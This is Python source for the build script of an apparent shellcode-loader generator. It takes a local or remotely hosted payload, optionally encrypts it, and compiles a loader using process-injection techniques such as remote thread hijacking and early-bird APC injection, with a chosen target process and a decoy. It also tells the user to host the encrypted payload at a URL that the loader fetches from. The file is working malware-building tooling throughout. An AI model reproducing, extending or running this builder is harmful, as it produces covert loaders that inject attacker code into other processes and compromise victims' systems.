import os
import time
import json
from Cast.cli import *
from Cast.local_load import *
from Cast.encryptor import *
from Cast.random_spells import *
from Cast.builder import *

def change_header_file(Enumeration, Loader, ApiMode):
    try:
        with open(f"Spells/{Enumeration}", "r") as file:
            content = file.read()
        content = content.replace('#include "api.h"', f'#include "../{ApiMode}"')
        with open(f"Spells/{Enumeration}", "w") as file:
            file.write(content)
    except:
        pass

    with open(f"Spells/{Loader}", "r") as file:
        content = file.read()
    content = content.replace('#include "api.h"', f'#include "../{ApiMode}"')
    with open(f"Spells/{Loader}", "w") as file:
        file.write(content)

def restore_header_file(Enumeration, Loader, ApiMode):
    try:
        with open(f"Spells/{Enumeration}", "r") as file:
            content = file.read()
        content = content.replace(f'#include "../{ApiMode}"', '#include "api.h"')
        with open(f"Spells/{Enumeration}", "w") as file:
            file.write(content)
    except:
        pass

    with open(f"Spells/{Loader}", "r") as file:
        content = file.read()
    content = content.replace(f'#include "../{ApiMode}"', '#include "api.h"')
    with open(f"Spells/{Loader}", "w") as file:
        file.write(content)

def read_from_template(Path):
    Path = os.path.abspath(Path)
    with open(Path, "r") as file:
        data = json.load(file)
    return data

def build_template(Path, Url, Encryption, Enumeration, ProcessName, Loader, Decoy, ApiMode):
    Path = os.path.join(Path, "template.json")
    data = {
        "Url": Url,
        "Encryption": Encryption,
        "Enumeration": Enumeration,
        "ProcessName": ProcessName,
        "Loader": Loader,
        "Decoy": Decoy,
        "ApiMode": ApiMode
    }
    with open(Path, "w") as file:
        json.dump(data, file, indent=4)

def build_main(Payload_Location, Url, Encryption, Enumeration, Payload, ProcessName, Loader, Decoy, ApiMode):
    Path = input(f"""\nPath for the final build (Default .\\Build):

    >> """)
    if Path == "":
        Path = ".\\Build"
    
    Name = input(f"""\nFinaly the spell name (Default Random Spell Name):
    
    >> """)
    if Name == "":
        Name = spell_name()

    timestamp = time.strftime("%Y%m%d_%H%M%S")
    build_folder = os.path.join(Path, timestamp)
    os.makedirs(build_folder, exist_ok=True)
    Path = os.path.join(build_folder, Name)

    print(f"""
[+] Casting {Name}... 

    Skidaddle Skidoodle
    ╰( ⁰ ਊ ⁰ )━━☆ﾟ.*･｡ﾟ \n""")

    if not os.path.exists(build_folder):
        os.makedirs(build_folder)

    if Encryption != "null":
        build_encryptor(Encryption, Payload, build_folder)
        if Payload_Location == "1":
            Payload = read_encrypted_payload(build_folder)
        elif Payload_Location == "2":
            Payload = "null"
            print(f"""
\n[!!]NOTE[!!]
Encrypted Payload is saved as encrypted.bin
Please host the encrypted.bin at {Url}
[!!]NOTE[!!]\n""")

    if not build_template(build_folder, Url, Encryption, Enumeration, ProcessName, Loader, Decoy, ApiMode):
        print(f"\n[+] Template saved at {build_folder}")
    else:
        print(f"\n[!] Failed to save template at {build_folder}")

    if not build(Path, build_folder, Encryption, Enumeration, Payload, ProcessName, Loader, Url, Decoy):
        print(f"""
[+] Loader Built Successfully! At {build_folder}
    
    Have Fun! (ﾉ◕ヮ◕)ﾉ*:･ﾟ✧\n""")
    else:
        print(f"\n[!]Failed to build loader (╯°□°）╯︵ ┻━┻\n")
    
    if Payload_Location == "1":
        os.remove(f"{build_folder}\\encrypted.bin")

def main():

    Payload_Location = set_payload_location()
    if Payload_Location == "2":
        Url = set_url()
        Payload = remote_payload_fetch(Url)
    else:
        Payload = local_payload_fetch()
        Url = "null"
    
    Template = input(f"""\nDo you want to use a template? (Default No) (Y/N):
                
    >> """)
    if Template.lower() == "y":
        Template_Path = input(f"""\nPath for the template:
        
    >> """)
        data = read_from_template(Template_Path)
        Url = data["Url"]
        Encryption = data["Encryption"]
        Enumeration = data["Enumeration"]
        ProcessName = data["ProcessName"]
        Loader = data["Loader"]
        Decoy = data["Decoy"]
        ApiMode = data["ApiMode"]
        if "RemoteThreadHijacking.h" in Loader and "EnumationSpells" in Enumeration:
            change = input(f"""\n[!]NOTE[!]
RemoteThreadHijacking and Process Enumeration are not compatible.

You want to use RemoteThreadHijacking with CreateSuspended instead?
\n""")
            if change.lower() == "y":
                Enumeration = "CreationSpells/CreateSuspended.h"
            else:
                print(f"\n[!] Exiting...")
                exit(0)
        if "EarlyBirdApcInjection.h" in Loader and "EnumationSpells" in Enumeration:
            change = input(f"""\n[!]NOTE[!]
EarlyBirdApcInjection and Process Enumeration are not compatible.

You want to use EarlyBirdApcInjection with a process creatin technique?
\n""")
            if change.lower() == "y":
                Enumeration = set_proc_creation_type()
            else:
                print(f"\n[!] Exiting...")
                exit(0)
        change_header_file(Enumeration, Loader, ApiMode)
        build_main(Payload_Location, Url, Encryption, Enumeration, Payload, ProcessName, Loader, Decoy, ApiMode)
        restore_header_file(Enumeration, Loader, ApiMode)
        return
    else:
        pass
                    
    Encryption = set_payload_encryption()
    # else:
    #     Payload_Plain = "static const unsigned char Data_RawData[] = {" + ", ".join(map(lambda b: hex(b), Payload)) + "};"
    #     Payload = Payload_Plain
    #TODO  set_payload_encryption()

    if set_loader_type() == "1":
        Loader = set_local_loader_type()
        Enumeration = "null"
        ProcessName = "null"
    else:
        Loader = set_remote_loader_type()
        if Loader == "RemoteExecutionSpells/RemoteInjection.h" or Loader == "RemoteExecutionSpells/RemoteMappingInjection.h":
            if get_handle_type() == "1":
                Enumeration = set_proc_creation_type()
            else:
                Enumeration = set_enum_type()
        elif Loader == "RemoteExecutionSpells/RemoteThreadHijacking.h":
            Enumeration = "CreationSpells/CreateSuspended.h"
        elif Loader == "RemoteExecutionSpells/EarlyBirdApcInjection.h":
            Enumeration = set_proc_creation_type() 
    
        ProcessName = set_process_name()
    
    ApiMode = set_api_mode()

    change_header_file(Enumeration, Loader, ApiMode)

    Decoy = set_decoy()

    build_main(Payload_Location, Url, Encryption, Enumeration, Payload, ProcessName, Loader, Decoy, ApiMode)

    restore_header_file(Enumeration, Loader, ApiMode)

if __name__ == "__main__":
    main()
